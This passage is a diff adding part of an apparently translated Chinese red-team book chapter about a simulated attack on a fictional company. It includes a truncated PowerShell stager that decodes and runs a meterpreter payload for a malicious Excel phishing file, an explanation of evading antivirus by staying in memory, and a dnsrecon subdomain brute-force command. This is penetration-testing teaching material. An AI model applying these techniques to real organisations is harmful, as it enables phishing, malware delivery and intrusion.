@@ -310,12 +310,61 @@ FrontGun$ msfconsole -r meter.rc
 好的，现在要将此有效负载包含在Excel文件中，我们需要人工地深入了解代码。如果打开生成的meter.bat文件，您将看到其唯一目的是找出目标的体系结构并启动相应的PowerShell版本（x86或x64）：
 ![](./Chap2/13.Code-meter-bat.png)
 
+您可能已经注意到，meter.bat文件还以内联方式调用PS脚本，尽管这种掩饰并没有对命令进行编码。我们可以在VBA中转换该体系结构验证例程，然后从meter.bat文件中借用命令，我们可以开始了。
+
+如果我们想使用Lucky Strike，我们可以假设Excel最有可能在32位进程中运行（大多数情况下是安全的选择），选择适当的代码段，通过删除两个斜杠字符“ \”来进行清理，然后将其保存到一个名为meter.ps1的文件中:
+```
+Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New- Object IO.MemoryStream (,$([Convert]::FromBase64String("nVRtb9s4DP6eX0EYO [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
+```
+
+我们执行这个meter.ps1文件来检查它是否仍然可以正常工作。现在我们有了正常的PowerShell文件，我们可以使用Lucky Strike生成适当的恶意Excel文件。
+
+### 2.1.4 摘要
+综上所述，我们使用Gophish建立了一个电子邮件发送平台，收集了一些目标员工，并准备了两种功能强大的Excel恶意软件变种，它们很可能能绕过大多数防病毒保护。
+
+关于这种攻击媒介的妙处在于，如果攻击成功（实际上，我们看起来只需要数百名员工中的一个受害者），我们就能进入Greenbox！
+![](./Chap2/14.Network.png)
+
+为什么防病毒解决方案不是一个问题呢?
+
+防病毒解决方案主要基于签名来工作：即，文件中被标记为恶意的特定数据包。例如，防病毒软件会标记恶意软件Trojan.Var.A !！通过检查代码中的以下字节序列：0xFC99AADBA6143A。有些编辑器可能具有代码分析，反转，随机性检查等高级功能。但是，实际上，核心引擎主要基于签名。
 
 
+除了从头开始编码恶意软件的明显替代方案之外，还可以避免与任何已知的恶意软件匹配的特征，这是有关防病毒解决方案的一个重要事实，使它们易于完全绕过。
+
+他们只扫描磁盘上的文件！如果下载恶意文件，则将其写入“下载”文件夹，并立即由防病毒软件扫描并标记。现在，如果同一恶意文件直接注入内存，只要它不接触磁盘，就会触发零警报。
+
+为此，我们可以使用一小段称为暂存器的代码将恶意代码（加密或编码）保存在变量中。然后将该代码注入到内存中新的或已经存在的进程中。这样，就不会在磁盘上写入恶意文件。简而言之，这就是我们的Excel文件正在做什么。
+
+为什么防病毒软件无法检测到暂存器？有时候会这样。但是与真正的恶意软件相反，暂存器只是几行代码，可以很容易地进行调整以逃避所有签名检测.
+
+## 2.2 公众曝光
+在等待网络钓鱼诈骗达到目标的同时，我们研究互联网侧以寻找访问SPH基础设施的新颖方法。在下一章中，我们将首先映射它们的所有可见机器及其提供的服务（网站，邮件服务，VPN等），然后奠定我喜欢称之为“寻找小突破的艺术”的基础  - 这种裂缝可能会给我们提供我们正在寻找的即兴邀请。
+### 2.2.1.映射公共IP地址
+我们的第一个线索（就此而言，这是唯一的线索）是公司的名称：Slash＆Paul’s Holdings。我们可以轻松找到他们的主要网站，这反过来又给我们带来了第二块拼图，即公共DNS记录：sph-assets.com。
+
+但是，使用centralops.net（或domaintools.com），我们可以快速了解到，该网站的IP地址不是SPH拥有，而是Amazon拥有。因此，它不是位于Bluebox中，而是位于SPH数据中心之外的某个黑盒子当中。我们甚至不会费心去调查。
+![](./Chap2/15.WhoisRecord.png)
+
+我们如何在Bluebox中找到真实的服务器？这很简单：我们枚举所有可能的DNS名称（* .sph-assets.com），检查其对应的IP地址，并查看centralops.net是否将SLASH＆PAUL HOLDINGS INC列为IP段的所有者。
+
+诸如DNSRecon和DNScan之类的工具可自动执行此类请求，甚至提供最常用的子域列表来推动此搜索过程：Extranet.sph-assets.com，Lync.sph-assets.com，mail.sph-assets .com等
+
+```
+root@kali:~# dnsrecon -d sph-assets.com -t brt -D wordlists/domains_short.txt
+```
+![](./Chap2/16.dnsrecon.png)
 
 
+一旦编译好域名和IP地址的列表后，我们再次查询centralops.net，以查看哪些真正位于SPH拥有的IP范围内。
 
+就我们的场景而言，让我们假设SPH的公共IP都位于较小的子网172.31.19.0/25中，该子网承载以下Web应用程序:
+- Up.sph-assets.com 
+- Career.sph-assets.com 
+- Info.sph-assets.com 
+- Catalog.sph-assets.com
 
+###  2.2.2.Web应用
 
 
 
